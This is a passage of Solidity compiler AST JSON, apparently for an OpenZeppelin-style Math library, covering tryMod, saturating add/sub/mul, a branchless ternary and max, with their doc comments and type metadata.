}]},"documentation":{"id":2227,"nodeType":"StructuredDocumentation","src":"3348:123:6","text":" @dev Returns the remainder of dividing two unsigned integers, with a success flag (no division by zero)."},"id":2247,"implemented":true,"kind":"function","modifiers":[],"name":"tryMod","nameLocation":"3485:6:6","nodeType":"FunctionDefinition","parameters":{"id":2232,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2229,"mutability":"mutable","name":"a","nameLocation":"3500:1:6","nodeType":"VariableDeclaration","scope":2247,"src":"3492:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2228,"name":"uint256","nodeType":"ElementaryTypeName","src":"3492:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2231,"mutability":"mutable","name":"b","nameLocation":"3511:1:6","nodeType":"VariableDeclaration","scope":2247,"src":"3503:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2230,"name":"uint256","nodeType":"ElementaryTypeName","src":"3503:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3491:22:6"},"returnParameters":{"id":2237,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2234,"mutability":"mutable","name":"success","nameLocation":"3542:7:6","nodeType":"VariableDeclaration","scope":2247,"src":"3537:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2233,"name":"bool","nodeType":"ElementaryTypeName","src":"3537:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2236,"mutability":"mutable","name":"result","nameLocation":"3559:6:6","nodeType":"VariableDeclaration","scope":2247,"src":"3551:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2235,"name":"uint256","nodeType":"ElementaryTypeName","src":"3551:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3536:30:6"},"scope":3686,"src":"3476:322:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2276,"nodeType":"Block","src":"3989:122:6","statements":[{"assignments":[2258,2260],"declarations":[{"constant":false,"id":2258,"mutability":"mutable","name":"success","nameLocation":"4005:7:6","nodeType":"VariableDeclaration","scope":2276,"src":"4000:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2257,"name":"bool","nodeType":"ElementaryTypeName","src":"4000:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2260,"mutability":"mutable","name":"result","nameLocation":"4022:6:6","nodeType":"VariableDeclaration","scope":2276,"src":"4014:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2259,"name":"uint256","nodeType":"ElementaryTypeName","src":"4014:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2265,"initialValue":{"arguments":[{"id":2262,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2250,"src":"4039:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2263,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2252,"src":"4042:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2261,"name":"tryAdd","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2140,"src":"4032:6:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (uint256,uint256) pure returns (bool,uint256)"}},"id":2264,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4032:12:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"nodeType":"VariableDeclarationStatement","src":"3999:45:6"},{"expression":{"arguments":[{"id":2267,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2258,"src":"4069:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"id":2268,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2260,"src":"4078:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"arguments":[{"id":2271,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4091:7:6","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":2270,"name":"uint256","nodeType":"ElementaryTypeName","src":"4091:7:6","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"}],"id":2269,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"4086:4:6","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":2272,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4086:13:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint256","typeString":"type(uint256)"}},"id":2273,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"4100:3:6","memberName":"max","nodeType":"MemberAccess","src":"4086:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2266,"name":"ternary","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2354,"src":"4061:7:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (bool,uint256,uint256) pure returns (uint256)"}},"id":2274,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4061:43:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2256,"id":2275,"nodeType":"Return","src":"4054:50:6"}]},"documentation":{"id":2248,"nodeType":"StructuredDocumentation","src":"3804:103:6","text":" @dev Unsigned saturating addition, bounds to `2²⁵⁶ - 1` instead of overflowing."},"id":2277,"implemented":true,"kind":"function","modifiers":[],"name":"saturatingAdd","nameLocation":"3921:13:6","nodeType":"FunctionDefinition","parameters":{"id":2253,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2250,"mutability":"mutable","name":"a","nameLocation":"3943:1:6","nodeType":"VariableDeclaration","scope":2277,"src":"3935:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2249,"name":"uint256","nodeType":"ElementaryTypeName","src":"3935:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2252,"mutability":"mutable","name":"b","nameLocation":"3954:1:6","nodeType":"VariableDeclaration","scope":2277,"src":"3946:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2251,"name":"uint256","nodeType":"ElementaryTypeName","src":"3946:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3934:22:6"},"returnParameters":{"id":2256,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2255,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2277,"src":"3980:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2254,"name":"uint256","nodeType":"ElementaryTypeName","src":"3980:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3979:9:6"},"scope":3686,"src":"3912:199:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2296,"nodeType":"Block","src":"4294:73:6","statements":[{"assignments":[null,2288],"declarations":[null,{"constant":false,"id":2288,"mutability":"mutable","name":"result","nameLocation":"4315:6:6","nodeType":"VariableDeclaration","scope":2296,"src":"4307:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2287,"name":"uint256","nodeType":"ElementaryTypeName","src":"4307:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2293,"initialValue":{"arguments":[{"id":2290,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2280,"src":"4332:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2291,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2282,"src":"4335:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2289,"name":"trySub","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2175,"src":"4325:6:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (uint256,uint256) pure returns (bool,uint256)"}},"id":2292,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4325:12:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"nodeType":"VariableDeclarationStatement","src":"4304:33:6"},{"expression":{"id":2294,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2288,"src":"4354:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2286,"id":2295,"nodeType":"Return","src":"4347:13:6"}]},"documentation":{"id":2278,"nodeType":"StructuredDocumentation","src":"4117:95:6","text":" @dev Unsigned saturating subtraction, bounds to zero instead of overflowing."},"id":2297,"implemented":true,"kind":"function","modifiers":[],"name":"saturatingSub","nameLocation":"4226:13:6","nodeType":"FunctionDefinition","parameters":{"id":2283,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2280,"mutability":"mutable","name":"a","nameLocation":"4248:1:6","nodeType":"VariableDeclaration","scope":2297,"src":"4240:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2279,"name":"uint256","nodeType":"ElementaryTypeName","src":"4240:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2282,"mutability":"mutable","name":"b","nameLocation":"4259:1:6","nodeType":"VariableDeclaration","scope":2297,"src":"4251:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2281,"name":"uint256","nodeType":"ElementaryTypeName","src":"4251:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4239:22:6"},"returnParameters":{"id":2286,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2285,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2297,"src":"4285:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2284,"name":"uint256","nodeType":"ElementaryTypeName","src":"4285:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4284:9:6"},"scope":3686,"src":"4217:150:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2326,"nodeType":"Block","src":"4564:122:6","statements":[{"assignments":[2308,2310],"declarations":[{"constant":false,"id":2308,"mutability":"mutable","name":"success","nameLocation":"4580:7:6","nodeType":"VariableDeclaration","scope":2326,"src":"4575:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2307,"name":"bool","nodeType":"ElementaryTypeName","src":"4575:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2310,"mutability":"mutable","name":"result","nameLocation":"4597:6:6","nodeType":"VariableDeclaration","scope":2326,"src":"4589:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2309,"name":"uint256","nodeType":"ElementaryTypeName","src":"4589:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2315,"initialValue":{"arguments":[{"id":2312,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2300,"src":"4614:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2313,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2302,"src":"4617:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2311,"name":"tryMul","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2205,"src":"4607:6:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (uint256,uint256) pure returns (bool,uint256)"}},"id":2314,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4607:12:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"nodeType":"VariableDeclarationStatement","src":"4574:45:6"},{"expression":{"arguments":[{"id":2317,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2308,"src":"4644:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"id":2318,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2310,"src":"4653:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"arguments":[{"id":2321,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4666:7:6","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":2320,"name":"uint256","nodeType":"ElementaryTypeName","src":"4666:7:6","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"}],"id":2319,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"4661:4:6","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":2322,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4661:13:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint256","typeString":"type(uint256)"}},"id":2323,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"4675:3:6","memberName":"max","nodeType":"MemberAccess","src":"4661:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2316,"name":"ternary","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2354,"src":"4636:7:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (bool,uint256,uint256) pure returns (uint256)"}},"id":2324,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4636:43:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2306,"id":2325,"nodeType":"Return","src":"4629:50:6"}]},"documentation":{"id":2298,"nodeType":"StructuredDocumentation","src":"4373:109:6","text":" @dev Unsigned saturating multiplication, bounds to `2²⁵⁶ - 1` instead of overflowing."},"id":2327,"implemented":true,"kind":"function","modifiers":[],"name":"saturatingMul","nameLocation":"4496:13:6","nodeType":"FunctionDefinition","parameters":{"id":2303,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2300,"mutability":"mutable","name":"a","nameLocation":"4518:1:6","nodeType":"VariableDeclaration","scope":2327,"src":"4510:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2299,"name":"uint256","nodeType":"ElementaryTypeName","src":"4510:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2302,"mutability":"mutable","name":"b","nameLocation":"4529:1:6","nodeType":"VariableDeclaration","scope":2327,"src":"4521:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2301,"name":"uint256","nodeType":"ElementaryTypeName","src":"4521:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4509:22:6"},"returnParameters":{"id":2306,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2305,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2327,"src":"4555:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2304,"name":"uint256","nodeType":"ElementaryTypeName","src":"4555:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4554:9:6"},"scope":3686,"src":"4487:199:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2353,"nodeType":"Block","src":"5158:207:6","statements":[{"id":2352,"nodeType":"UncheckedBlock","src":"5168:191:6","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2350,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2339,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2334,"src":"5306:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2348,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2342,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2340,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2332,"src":"5312:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"id":2341,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2334,"src":"5316:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5312:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2343,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"5311:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"arguments":[{"id":2346,"name":"condition","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2330,"src":"5337:9:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":2344,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"5321:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":2345,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"5330:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"5321:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":2347,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5321:26:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5311:36:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2349,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"5310:38:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5306:42:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2338,"id":2351,"nodeType":"Return","src":"5299:49:6"}]}]},"documentation":{"id":2328,"nodeType":"StructuredDocumentation","src":"4692:374:6","text":" @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\n IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\n However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\n one branch when needed, making this function more expensive."},"id":2354,"implemented":true,"kind":"function","modifiers":[],"name":"ternary","nameLocation":"5080:7:6","nodeType":"FunctionDefinition","parameters":{"id":2335,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2330,"mutability":"mutable","name":"condition","nameLocation":"5093:9:6","nodeType":"VariableDeclaration","scope":2354,"src":"5088:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2329,"name":"bool","nodeType":"ElementaryTypeName","src":"5088:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2332,"mutability":"mutable","name":"a","nameLocation":"5112:1:6","nodeType":"VariableDeclaration","scope":2354,"src":"5104:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2331,"name":"uint256","nodeType":"ElementaryTypeName","src":"5104:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2334,"mutability":"mutable","name":"b","nameLocation":"5123:1:6","nodeType":"VariableDeclaration","scope":2354,"src":"5115:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2333,"name":"uint256","nodeType":"ElementaryTypeName","src":"5115:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5087:38:6"},"returnParameters":{"id":2338,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2337,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2354,"src":"5149:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2336,"name":"uint256","nodeType":"ElementaryTypeName","src":"5149:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5148:9:6"},"scope":3686,"src":"5071:294:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2372,"nodeType":"Block","src":"5502:44:6","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2367,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2365,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2357,"src":"5527:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"id":2366,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2359,"src":"5531:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5527:5:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"id":2368,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2357,"src":"5534:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2369,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2359,"src":"5537:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2364,"name":"ternary","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2354,"src":"5519:7:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (bool,uint256,uint256) pure returns (uint256)"}},"id":2370,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5519:20:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2363,"id":2371,"nodeType":"Return","src":"5512:27:6"}]},"documentation":{"id":2355,"nodeType":"StructuredDocumentation","src":"5371:59:6","text":" @dev Returns the largest of two numbers."},"id":2373,"implemented":true,"kind":"function","modifiers":[],"name":"max","nameLocation":"5444:3:6","nodeType":"FunctionDefinition","parameters":{"id":2360,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2357,"mutability":"mutable","name":"a","nameLocation":"5456:1:6","nodeType":"VariableDeclaration","scope":2373,"src":"5448:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2356,"name":"uint256","nodeType":"ElementaryTypeName","src":"5448:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2359,"mutability":"mutable","name":"b","nameLocation":"5467:1:6","nodeType":"VariableDeclaration","scope":2373,"src":"5459:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2358,"name":"uint256","nodeType":"ElementaryTypeName","src":"5459:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5447:22:6"},"returnParameters":{"id":2363,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2362,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2373,"src":"5493:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2361,"name":"uint256","nodeType":"ElementaryTypeName","src":"5493:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5492:9:6"},"scope":3686,"src":"5435:111:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2391,"nodeType":"Block","src":"5684:44:6","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2386,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2384,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2376,"src":"5709:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":2385,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2378,"src":"5713:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5709:5:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"id":2387,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2376,"src":"5716:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2388,"name":"b","nodeT